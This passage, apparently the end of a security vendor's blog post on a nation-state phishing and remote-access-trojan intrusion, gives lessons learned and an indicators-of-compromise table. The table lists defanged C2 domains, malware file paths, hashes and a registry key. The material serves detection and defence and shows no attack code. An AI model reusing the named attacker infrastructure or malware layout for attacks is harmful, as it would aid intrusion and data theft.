https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981"/></picture></div></figure><p>There is no further correspondence in the email chain. The threat actor had what they wanted, and the victims were unaware they had just been phished—because it was, after all, a very clever ploy.</p><p>After we had finished our investigation and shared everything learned with the targeted organization, we continued our analysis. We found one particularly interesting news article dating back to December of 2021: “<a href="https://www.nknews.org/2020/12/hackers-use-fake-media-domains-to-trick-north-korea-researchers/" target="_blank">Hackers use fake media domains to trick North Korea researchers</a>”... specifically VOA, under the very same guise. </p><p>Looking back, this was very clever malware filled with living-off-the-land techniques, using normally trusted software with OneDrive and Google Drive, staged with a particular stealthy phishing lure… but, we were disappointed in what earned the damning click.</p><figure class="w-richtext-figure-type-image w-richtext-align-center" data-rt-type="image" data-rt-align="center"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8"/></picture></div></figure><p>The malicious Word document itself is the most cookie-cutter, vanilla phish bait that one might see in generic and bland cybersecurity training. Despite how often security professionals scream and shout about these barebone basics of security hygiene, still this can slip by and damage an organization. </p><p>“Please click here” is all an APT needs.</p><h2>Lessons Learned</h2><p>The adversary here is likely a well-funded nation-state-supported threat actor, whose operations are known for their phishing prowess and building trust or a connection before dangling the lure. The remote access trojan and data exfiltration capabilities have been present and active in the target environment for <em>nearly a year</em>. </p><p>We tend to share statistics and infographics about hacker dwell-time being weeks, or months, but this malware has gone unnoticed for much longer. While the victim organization <em>had</em> antivirus, the threat still slipped past. From our own analysis, looking through the logs, it is disheartening to see the exact moment where prevention efforts fell short.</p><p>With that, we offer a gentle reminder: <span class="highlight">prevention will fail. There is immense value, though, in logging, monitoring, and hunting</span>. All the threads of this story could not have unfolded without the data retention and logged information available to our team of analysts and investigators. </p><p>Whether the infecting malware stems from an unskilled actor, just grabbing code off the shelf, or a trained and sophisticated APT, detection and human analysis must be in play.</p><p>The Huntress Managed Security Platform has been augmenting more features and functionality to enrich our partners&#x27; reporting and insight. Combining the powers of each of these services (Persistent Footholds, Managed Antivirus, Process Insights, etc.), we can gain a greater understanding of incidents and compromises—and for finding APT activity on a trialing partner&#x27;s system, we hope that offers a great example.</p><p><strong>• • •</strong></p><p><strong>Special thanks to analysts, researchers, account representatives, engineers and all involved in response to this incident and their contributions to this blog:</strong> Cat Contillo, Matt Anderson, Caleb Stewart, Dave Kleinatland, John Hammond, Matthew Brennan, Tim Kasper, Clarissa Bove, Jamie Levy, Max Rogers, Greg Ake, Rob Noeth and Sharon Martin.</p><p><br/></p><h4>Indicators of Compromise</h4><p><span class="highlight">TypeItemNotes / sha256 HashURLretmodul[.]comAccessed during execution of </span>normal.crp.  May be used to signal success of attack.URLhodbeast[.]comStaging C2 urlURLworldinfocontact[.]clubBeaconing C2 urlURLfrebough[.]comStaging C2 urlURLbeastmodser[.]clubStaging C2 urlStringsH:\Hollow\googleDrive_rat_load_complete\rat_load\Release\rat_load.pdbString in desktop.xml and desktop.r5uRegistry KeyHKEY_CURRENT_USER\Software\RegisteredApplications\[random characters]Contained code that was executed by sys0.vbsFilec:\Users\&lt;user&gt;\AppData\Roaming\desktop.tmp5b31d65b0607ae3de40ff8376bb83f3ff4defba3b564c380be5514d9766978eaFileC:\Users\&lt;user&gt;\AppData\Roaming\r.vbsc86d6e9dfc79bdf29f0826327992f8cf3df3e1ed6b41f1c8f6ee67b32bef3a6bFileC:\Users\&lt;user&gt;\AppData\Roaming\1.vbsc86d6e9dfc79bdf29f0826327992f8cf3df3e1ed6b41f1c8f6ee67b32bef3a6bFileC:\Users\&lt;user&gt;\Microsoft\sys0.vbsbf82675bac2cd574fa8b87659217bffb29d4bc49b355b405ac4cd2666cd72f5aFileC:\Users\&lt;user&gt;\Microsoft\sys1.vbsbf82675bac2cd574fa8b87659217bffb29d4bc49b355b405ac4cd2666cd72f5aFileC:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\desktop.xml<span class="highlight"><br/><br/>As a certificate: </span>2ad3266331e405677c68bb43c490467107ca398d3ce430080a4db92036c93160<span class="highlight"><br/><br/>Converted DLL: e314b40449b7b9b84f20f49f89888511433573377e007e5c1e94fd84ecf17caf<br/><br/>File</span>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\desktop.r5u<span class="highlight">As a certificate: </span>2ad3266331e405677c68bb43c490467107ca398d3ce430080a4db92036c93160<span class="highlight"><br/><br/>Converted DLL: e314b40449b7b9b84f20f49f89888511433573377e007e5c1e94fd84ecf17caf<br/><br/>File</span>C:\Users\&lt;user&gt;\AppData\Local\Microsoft\OneDrive\version.dll<span class="highlight"><br/><br/></span>[hash unavailable]FileC:\Users\&lt;user&gt;\AppData\Local\Microsoft\OneDrive\version.tmp[hash unavailable]FileC:\Users\&lt;user&gt;\AppData\Roaming\normal.crpe3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855FileC:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Windows\qwert.vbs<span class="highlight"><br/><br/>e08fe0b287b4d112514276c2b102b9c80b4dab73257f06ab24231329389ad931<br/><br/>File</span>C:\Users\&lt;user&gt;\AppData\Microsoft\ttmp.log<span class="highlight"><br/><br/>[hash unavailable]<br/><br/>File</span>C:\Users\&lt;user&gt;\AppData\Microsoft\filexx.tmp<span class="highlight"><br/><br/>Checked by </span>normal.crp <span class="highlight">for run status, created if not run previously. Contents are 111File</span>C:\Users\&lt;user&gt;\AppData\Microsoft\schedxx.tmp</p><p>Checked by normal.crp<span class="highlight"> for run status, created if not run previously. Contents are 111File</span>C:\Users\&lt;user&gt;\AppData\Local\Temp\CF8C.vbs<span class="highlight"><br/><br/>[hash unavailable]File</span>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\dev.ps1<span class="highlight"><br/><br/>def0975728fc5da61c022bb62b7160e2764631b852ec7f83951263c7830bec8d<br/><br/>File</span>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\pow.ps1<span class="highlight"><br/><br/>d41c943fd5ffacde74f487df6a43b72e9730f05812b9b1f8dc874bd486f182b3<br/><br/>File</span>c:\users\&lt;user&gt;\appdata\roaming\Microsoft\living.log(Hash varies based off the current time)FileC:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\tabid_chrome.log<span class="highlight"><br/><br/>(Hash varies due to logging)<br/><br/>File</span>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\tabid_edge.log<span class="highlight"><br/><br/>(Hash varies due to logging)<br/><br/>Filec:</span>\Users\&lt;user&gt;\AppData\Roaming\microsoft\Windows\start menu\Programs\Startup\OneNote.vbs[.highlight]<br/><br/>c327631a212e4a9681e3cf1574c500ce3700186cc605ae08db5878ecb0bfe66f<br/><br/>(Note: hash may vary across different machines)</p><p> <br/></p><figure class="w-richtext-figure-type-image w-richtext-align-center" data-rt-type="image" data-rt-align="center"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328"/></picture></div></figure><h4><a href="/authors/john-hammond" data-discover="true">John Hammond.</a> Threat hunter. Education enthusiast. Senior Security Researcher at Huntress.</h4></div></div></div></div><div class="blog-sidebar"><div class="blog-sidebar-inner"><div class="blog-category-list-wrapper"><div class="category-heading">Categories<br/></div><div><div role="list" class="blog-category-sidebar-list "><div role="listitem"><a href="/blog-categories/response-to-incidents" class="category-sidebar-item">Response to Incidents</a></div></div></div></div><div class="sidebar-cta"><h4 class="sidebar-cta-heading">See Huntress in action</h4><div class="sidebar-cta-text"><p>Our platform combines a suite of powerful managed detection and response tools for endpoints and Microsoft 365 identities, science-backed security awareness training, and the expertise of our 24/7 Security Operations Center (SOC).</p></div><div><a href="/demo" class="primary-button hero small w-button" rel="  ">Book a Demo</a></div></div><div class="blog-social-icons horizontal"><div class="socials-text">Share</div><div class="social-grid horizontal"><a data-share-facebook="true" href="https://www.facebook.com/sharer/sharer.php?u=https://www.huntress.com/blog/targeted-apt-activity-babyshark-is-out-for-blood" class="social-links-icons facebook w-inline-block" target="_blank"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F124e49f43fd041659989deffd90e3b7c" loading="eager" alt="Facebook icon" class="social-links-icons"/></a><a data-share-twitter="true" href="https://twitter.com/share?url=https://www.huntress.com/blog/targeted-apt-activity-babyshark-is-out-for-blood" class="social-links-icons twitter w-inline-block" target="_blank"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fa59264f69adf4a4cb0092faaf95a5669" loading="eager" alt="Twitter X icon" class="social-links-icons"/></a><a data-share-linkedin="true" href="https://www.linkedin.com/shareArticle?mini=true&amp;amp;url=https://www.huntress.com/blog/targeted-apt-activity-babyshark-is-out-for-blood" class="social-links-icons linkedin w-inline-block" target="_blank"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2a9064f27e10467cae2ee3bd79beead9" loading="eager" alt="Linkedin icon" class="social-links-icons"/></a><a data-share-reddit="true" href="http://www.reddit.com/submit?url=https://www.huntress.com/blog/targeted-apt-activity-babyshark-is-out-for-blood" class="social-links-icons reddit w-inline-block" target="_blank"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ff043c73bb2de45c6b1102fe11ffebedb" loading="eager" alt="Download icon" class="social-links-icons"/></a></div></div></div></div></div></div></section></div><div class="builder-block builder-2b27cff7899944738e3b3d18be93d1f3 builder-has-component css-4hp89i" builder-id="builder-2b27cff7899944738e3b3d18be93d1f3"><section class="related-resources-section blog-related-resources-section"><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F97d1ebf9f67945c9af2c6341e585bc21" loading="lazy" alt="Glitch effect" class="related-glitch-top-right"/><div class="w-layout-blockcontainer container-1304 w-container"><div class="related-resources-div-block"><h2 class="heading-7">You Might Also Like</h2><p class="paragraph-9"></p></div></div><div class="w-layout-blockcontainer container-1304 w-container"><div><div id="w-node-_4d86426b-a059-499f-3630-0a5865df107c-b9c729ba"><div role="list" class="related-resources-block-box "><div role="listitem" class="flex-column "><a href="/blog/rapid-response-samsung-magicinfo9-server-flaw" class="br10 blog-listing-box w-inline-block"><div class="related-resources-thumbnail-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94d861c26a78420b94c6695444187e65" alt="" class="related-resources-box-image pos-absolute"/></div><div class="related-resources-div-wrap related-resources-block-mini height-100"><h4 class="heading-8 blog-heading">Rapid Response: Samsung MagicINFO 9 Server Flaw</h4><div data-w-id="4d86426b-a059-499f-3630-0a5865df1086" class="secondary-button-4 blog-button"><div class="secodnary-button-text-6">Learn More</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="" class="secondary-button-icon-2 blog-secondary-button-icon-2" style="transform:translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);transform-style:preserve-3d"/></div></div></a></div><div role="listitem" class="flex-column "><a href="/blog/faq-asus-liveupdate-attack-operation-shadowhammer-9fc9c03b2da9" class="br10 blog-listing-box w-inline-block"><div class="related-resources-thumbnail-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F28e05784f2584d25824e4b27c802f97a" alt="" class="related-resources-box-image pos-absolute"/></div><div class="related-resources-div-wrap related-resources-block-mini height-100"><h4 class="heading-8 blog-heading">Rapid Response: ASUS Live Update Attack (Operation ShadowHammer)</h4><div data-w-id="4d86426b-a059-499f-3630-0a5865df1086" class="secondary-button-4 blog-button"><div class="secodnary-button-text-6">Learn More</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="" class="secondary-button-icon-2 blog-secondary-button-icon-2" style="transform:translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);transform-style:preserve-3d"/></div></div></a></div><div role="listitem" class="flex-column "><a href="/blog/troubleshooting-procmon-sysmon-v3-32-c4397dc75f50" class="br10 blog-listing-box w-inline-block"><div class="related-resources-thumbnail-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F28e05784f2584d25824e4b27c802f97a" alt="" class="related-resources-box-image pos-absolute"/></div><div class="related-resources-div-wrap related-resources-block-mini height-100"><h4 class="heading-8 blog-heading">Troubleshooting Procmon &amp; Sysmon v3.32</h4><div data-w-id="4d86426b-a059-499f-3630-0a5865df1086" class="secondary-button-4 blog-button"><div class="secodnary-button-text-6">Learn More</div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F779e332a141048329fb98c924119138a" loading="lazy" alt="" class="secondary-button-icon-2 blog-secondary-button-icon-2" style="transform:translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);transform-style:preserve-3d"/></div></div></a></div></div></div></div></div><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4c269018ce94700a59e351c5b9edb99" loading="lazy" alt="" class="related-resources-shap-1 desktop blog-related-glitch"/><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1aa59311842f4ca6bda70300ff181cf9" loading="lazy" alt="" class="related-resources-shap-7"/><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9ad6bcb77d1842b98142269ef70c4f47" loading="lazy" alt="" class="related-resources-shap-6"/></section></div><div class="builder-block builder-0f50d623022042208a513ab79514b79b builder-has-component css-4hp89i" builder-id="builder-0f50d623022042208a513ab79514b79b"><section data-w-id="f6544d89-ec66-1206-8508-b30ad6592c68" style="opacity:1;transform:translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);transform-style:preserve-3d" class="call-to-action-section"><div class="w-layout-blockcontainer container-width-1286 bg-container-mobile md-px-20 w-container"><div class="gradient-blue-green-2 cta-gradient-blue-green"><div class="latest-resources-feature-post"><div class="latest-resources-feature-post-description lg:pr-10"><h2 class="latest-resources-sub-heading-2 cta-latest-resources-sub-heading">Sign Up for Huntress Updates</h2><p class="paragraph-large margin-bottom-52">Get insider access to Huntress tradecraft, killer events, and the freshest blog updates.</p><div class="w-full "><div id="anchor-blog-signup-form" class="responsive-anchor"></div><div class="_formWrap_wqkc6_25"><div class=""><div class="_form_wqkc6_1 pt-5 pb-0 px-0"><form id="wf-form-Blog-Signup-Form" name="wf-form-Blog-Signup-Form" data-hs-cf-bound="false" data-hubspot-form-id="5198e52f-a296-4d78-935d-fe864d69a67a" class="_formGrid_wqkc6_107"><div class="_formGroup_wqkc6_116 _colspan2_wqkc6_130"><div class="_wrapper_1ark4_1"><input type="email" class="_input_1ark4_7 responsive-anchor" aria-invalid="false" id="email" autoComplete="email" data-snowplow-fieldname="email" data-ignore-nb="true" name="email" value=""/><label class="_label_1ark4_28">Work Email*</label></div></div><div class="_formGroup_wqkc6_116 _colspan2_wqkc6_130"><div class="_submitButtonRow_wqkc6_134"><div class="turnstile-wrapper"><div id="cf-turnstile" style="width:300px;height:65px"></div> <div></div></div><button class="_primaryButton_1tx4z_1 _submitButton_wqkc6_134 " aria-label="Submit" type="submit" id="submitButton"><div class="_buttonText_1tx4z_83">Submit</div></button></div></div><div class="_formGroup_wqkc6_116 _colspan2_wqkc6_130"><div class="_privacyPolicy_wqkc6_183">By submitting this form, you accept our<!-- --> <a class="_noWrap_wqkc6_250" href="/terms-of-use" target="_blank" data-discover="true">Terms of Service</a> <!-- -->&amp;<!-- --> <a class="_noWrap_wqkc6_250" href="/privacy-policy" target="_blank" data-discover="true">Privacy Policy</a></div></div><input type="hidden" data-io-platform-fieldname="user[correlation_id]" data-snowplow-fieldname="correlation_id" name="correlation_id" value="9422b213-1aec-4cd5-a891-d31830da8dc5"/><input type="hidden" data-io-platform-fieldname="user[utm_source]" name="utm_source" value=""/><input type="hidden" data-io-platform-fieldname="user[utm_medium]" name="utm_medium" value=""/><input type="hidden" data-io-platform-fieldname="user[utm_campaign]" name="utm_campaign" value=""/><input type="hidden" data-io-platform-fieldname="user[utm_content]" name="utm_content" value=""/><input type="hidden" data-io-platform-fieldname="user[utm_keyword]" name="utm_keyword" value=""/><input type="hidden" name="page_url" value=""/><input type="hidden" name="pageUri" value=""/><input type="hidden" name="hutk" value=""/></form></div></div><div class="text-pretty md:text-balance subscribe-success-state _successState_wqkc6_198 " tabindex="-1" role="region" aria-label="Schedule a demo success"><div>Thank you! Your submission has been received!</div></div><div class="text-pretty md:text-balance error-message-alt _errorMessage_wqkc6_218 " tabindex="-1" role="region" aria-label="Schedule a demo failure"><div>Oops! Something went wrong while submitting the form.</div></div></div></div></div><div class="latest-resources-feature-post-image-wrapper cta-latest-resources-feature-post-image-wrapper"><img loading="lazy" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcb5efa5143804ba59d530a903d29fe5f" alt="Huntress at work" class="latest-resources-feature-post-image cta-latest-resources-feature-post-image"/></div></div></div></div></section></div><style data-emotion-css="191e8qc">.css-191e8qc.builder-block{height:0;width:0;display:inline-block;opacity:0;overflow:hidden;pointer-events:none;}</style><img src="https://cdn.builder.io/api/v1/pixel?apiKey=3eb6f92aedf74f109c7b4b0897ec39a8" aria-hidden="true" alt="" role="presentation" width="0" height="0" class="builder-block builder-pixel-cocjac87fzf css-191e8qc" builder-id="builder-pixel-cocjac87fzf"/></div></div></div></div></div><div><footer id="main-site-footer" class="footer"><div class="w-layout-blockcontainer primary-container w-container"><div class="footer-inner-grid footer-inner-four-grid"><div data-hover="false" data-delay="0" id="w-node-_8db5101a-d165-e0e7-c7a6-e04b30595352-3059534f" data-w-id="8db5101a-d165-e0e7-c7a6-e04b30595352" class="footer-col w-dropdown"><div class="footer-title-container w-dropdown-toggle " id="w-dropdown-toggle-5" aria-controls="w-dropdown-list-5" aria-haspopup="menu" aria-expanded="true" role="button" tabindex="0"><h5 class="footer-title">Platform</h5><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fec8c1f5fc9134c75bd9877ca0323392a" loading="lazy" alt="down arrow" class="footer-caret"/></div><nav class="footer-nav-item-container w-dropdown-list footer-column " id="w-dropdown-list-5" aria-labelledby="w-dropdown-toggle-5"><a href="/platform" class="footer-nav-item" tabindex="0">Huntress Managed Security Platform</a><a href="/platform/managed-edr" aria-current="page" class="footer-nav-item w--current" tabindex="0">Managed EDR</a><a href="/platform/managed-edr-for-macos" class="footer-nav-item" tabindex="0">Managed EDR for macOS</a><a href="/platform/managed-itdr" class="footer-nav-item" tabindex="0">Managed ITDR</a><a href="/platform/siem" class="footer-nav-item" tabindex="0">Managed SIEM</a><a href="/platform/security-awareness-training" class="footer-nav-item" tabindex="0">Managed Security Awareness Training</a><a href="/demo" class="footer-nav-item" tabindex="0">Book A Demo</a></nav></div><div data-hover="false" data-delay="0" data-w-id="8db5101a-d165-e0e7-c7a6-e04b3059535b" class="footer-col w-dropdown"><div class="footer-title-container w-dropdown-toggle " id="w-dropdown-toggle-6" aria-controls="w-dropdown-list-6" aria-haspopup="menu" aria-expanded="true" role="button" tabindex="0"><h5 class="footer-title">Solutions</h5><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fec8c1f5fc9134c75bd9877ca0323392a" loading="lazy" alt="down arrow" class="footer-caret"/></div><nav class="footer-nav-item-container w-dropdown-list footer-column " id="w-dropdown-list-6" aria-labelledby="w-dropdown-toggle-6"><a href="/solutions/topics/phishing" class="footer-nav-item" tabindex="0">Phishing</a><a href="/solutions/topics/cybersecurity-compliance" class="footer-nav-item" tabindex="0">Compliance</a><a href="/solutions/topics/business-email-compromise" class="footer-nav-item" tabindex="0">Business Email Compromise</a><a href="/industries/education" class="footer-nav-item" tabindex="0">Education</a><a href="/industries/financial-services" class="footer-nav-item" tabindex="0">Finance</a><a href="/industries/healthcare" class="footer-nav-item" tabindex="0">Healthcare</a><a href="/industries/manufacturing" class="footer-nav-item" tabindex="0">Manufacturing</a><a href="/industries/state-and-local-government" class="footer-nav-item" tabindex="0">State &amp; Local Government</a></nav></div><div data-hover="false" data-delay="0" data-w-id="8db5101a-d165-e0e7-c7a6-e04b30595364" class="footer-col w-dropdown"><div class="footer-title-container w-dropdown-toggle " id="w-dropdown-toggle-7" aria-controls="w-dropdown-list-7" aria-haspopup="menu" aria-expanded="true" role="button" tabindex="0"><h5 class="footer-title">Why Huntress?</h5><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fec8c1f5fc9134c75bd9877ca0323392a" loading="lazy" alt="down arrow" class="footer-caret"/></div><nav class="footer-nav-item-container w-dropdown-list footer-column " id="w-dropdown-list-7" aria-labelledby="w-dropdown-toggle-7"><a href="/why-huntress/managed-service-providers" class="footer-nav-item" tabindex="0">Managed Service Providers</a><a href="/why-huntress/value-added-resellers" class="footer-nav-item" tabindex="0">Value Added Resellers</a><a href="/why-huntress/businesses-it-teams" class="footer-nav-item" tabindex="0">Business &amp; IT Teams</a><a href="/why-huntress/24-7-soc" class="footer-nav-item" tabindex="0">24/7 SOC</a><a href="/success-stories" class="footer-nav-item" tabindex="0">Case Studies</a></nav></div><div data-hover="false" data-delay="0" data-w-id="8db5101a-d165-e0e7-c7a6-e04b3059536d" class="footer-col w-dropdown"><div class="footer-title-container w-dropdown-toggle " id="w-dropdown-toggle-8" aria-controls="w-dropdown-list-8" aria-haspopup="menu" aria-expanded="true" role="button" tabindex="0"><h5 class="footer-title">Resources</h5><img src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fec8c1f5fc9134c75bd9877ca0323392a" loading="lazy" alt="down arrow" class="footer-caret"/></div><nav class="footer-nav-item-container w-dropdown-list footer-column " id="w-dropdown-list-8" aria-labelledby="w-dropdown-toggle-8"><a href="/resources" class="footer-nav-item" tabindex="0">Resource Center</a><a href="/blog" class="footer-nav-item" 